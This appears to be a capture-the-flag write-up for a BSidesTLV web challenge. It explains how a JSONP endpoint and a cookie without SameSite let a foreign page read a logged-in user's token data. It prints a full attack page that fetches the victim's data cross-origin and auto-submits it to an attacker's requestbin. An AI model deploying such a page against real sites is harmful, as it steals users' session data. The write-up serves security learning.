# Challenge Instructions

```
Hi Agent! Your mission is to exfiltrate data of our target, so we can catch him! Can you do it?

URL: https://can-you-bypass-the-sop.ctf.bsidestlv.com/

BOT: https://can-you-bypass-the-sop.ctf.bsidestlv.com/bot
```

# Discovery

So the first thing that I realize is that we have a BOT url. Clicking on it brings us to a page with not much going on except for a textfield for a URL and a "Browse" button. From previous CTFs, this seemed like some sort of URL click bot that was running that would navigate to whatever URL was passed it. So to make sure, I fired up a request bin and passed in the URL to the bot. Sure enough, we get a hit.

![Test request bin](./requestbin.PNG)


With this in mind and the fact that the challenge name uses the term SOP, we're likely looking for some XSS variation that we can store inside a link or a webpage that we can send to the BOT to gain any secrets that it may hold.

After navigating to the main url, we're presented with a login page. We immediately see a "JOIN AS A GUEST" button. Clicking this grants us access to a welcome screen as a guest user. After being logged in as a guest, I noticed a JWT token added to my cookie storage in my browser, `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiZmxhZyI6IllvdSBhcmUgb24gdGhlIHJpZ2h0IHRyYWNrISIsImlhdCI6MTU5MzU1NjY3MX0.BOh06azgJcQFjPkzbYG4FnCUNsyfLniedmwXVgM9-0k`

Decoding the token, we get

```JSON
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "Guest",
  "flag": "You are on the right track!",
  "iat": 1593556671
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  256 secret,
) 
```

Interesting, the payload in the JWT token has a flag field. Also, the `SameSite` security flag was not set on the cookie, which means the site looks to be vulnerable to CSRF. It seems likely that if we can come up with some type of XSS, the user who clicks on our link will have their credentials passed in, even if the link was not originally from the `https://can-you-bypass-the-sop.ctf.bsidestlv.com` site. 

Snooping some more, we find the application code in the main.js file `https://can-you-bypass-the-sop.ctf.bsidestlv.com/js/main.js`. This script file stores the JavaScript functions that are called when someone signs in or joins as a guest. The function we are particularly interested in is

```javascript
function signIn() {
    let http = new XMLHttpRequest();
    http.open('POST', 'signIn', true);
    http.setRequestHeader('Content-type', 'application/json');
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState === 4 && http.status === 200) {
            $.ajax({
                dataType: 'jsonp',
                jsonp: 'callback',
                url: '/FetchUserInfo?callback=?',
                success: function (data) {
                    $("#login").html(
                        `<span class="login100-form-title p-b-70">Welcome ${data.username}!</span>
                                     <span class="login100-form-avatar">
                                     <img src="images/avatar-01.jpg" alt="AVATAR"></span>
                                     <div class="container-login100-form-btn" style="margin-top: 20px">
                                        <button class="login100-form-btn" id="select_div_SIGNIN" onclick="signOut()">
                                            Sign Out
                                        </button>
                                     </div>`);
                }
            });
        }
    };
    http.send(JSON.stringify({username: "Guest"}));
}
```

Something that should catch your eye pretty quickly is the second AJAX request and its use of the jsonp data type. A little background on JSONP, it is a mechanism that REST endpoints employed to bypass the same-origin policy (SOP). The same-origin policy and CORS is a security mechanism that browsers and web sites use to ensure that scripts and resources that are loaded from one origin cannot access resources from another origin. This is why if you navigated to your browser's web console while on a website and start making AJAX calls to another website on a different domain, your browser would stop you, as it would be breaching the SOP.

Some JSONP configurations allow you to define a `callback` parameter that is a function that is defined on the client side that when the request returns, it is automatically invoked and the code is executed. Navigating to the endpoint in question, we can see exactly what is happening. First by passing in `callback=i_control_this`
![callback example](./callback1.PNG)

and now `callback=with_whatever_I_want`

![callback example 2](./callback2.PNG)

Hmm, the callback function is being passed the payload to our JWT token. This is the last piece to our puzzle! If we can create a function that will ingest the object being passed back to to the JSONP callback function, we can send it as a URL parameter to an endpoint that we control and log the results.

Lets see what we can come up with!

# Solution

To put this all together we need 2 things.

1. We need to set up a requestbin to catch our request that will have the stolen cookie. That is simple enough.

2. To deploy the XSS, we need a way to host a web page. There are several services out there or you can use your own hosted website. I used [repl.it](https://repl.it/), which allows you to spin up proof of concept code snippets incredibly quickly. Below is the index.html file that is served whenever someone lands on my custom hosted website. 
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>repl.it</title>
    <link href="style.css" rel="stylesheet" type="text/css" />
    <script src="https://code.jquery.com/jquery-1.8.2.min.js"></script>
  </head>
  <body>
    <form action="https://requestbin.net/r/w4xs0xw4" method="GET" >
    <input type="hidden" name="data" value="template" id="input" />
    <script>
      $(document).ready(function(){
        $.ajax({
                dataType: 'jsonp',
                jsonp: 'callback',
                url: 'https://can-you-bypass-the-sop.ctf.bsidestlv.com/FetchUserInfo?callback=?',
                success: function (data) {
                    /*let http = new XMLHttpRequest()
                    http.open('POST', 'https://requestbin.net/r/w4xs0xw4', true);
                    http.setRequestHeader('Content-type', 'application/json');
                    http.send(JSON.stringify(data));*/
                    var input = document.getElementById("input");
                    console.log(data);
                    input.value = data.flag;
                    document.forms[0].submit();
                }
            });
      });
    </script>
  </body>
</html>
```

What this does is call the JSONP enabled endpoint, the same one that the original website does, as soon as the web page loads. Because the token cookie is not secured as mentioned before, if the user that navigates to this malicious URL is already signed into the `https://can-you-bypass-the-sop.ctf.bsidestlv.com`, the browser will do them a "favor" and send the token cookie along with the request ensuring that they will not need to log in again. Once the request from this endpoint returns, it will bring back the response from the JSONP endpoint with the object now in the logged in user's context. So, if someone that isn't `Logged in as guest` were to click on this link, they will have their own data object returned in the JSONP response.

Once we get that data back, the code can then append it as a URL parameter to GET request to our requestbin that is waiting for us which is what the success function does. It assigns the flag parameter as the hidden input value of our form and then submits it, effectively submitting a GET request to our hosted requestbin endpoint.

Pasting in our malicious URL that is hosted by repl.it to the BOT, we then wait a few moments and check our requestbin to find our flag waiting for us.

![flag](./flag.png)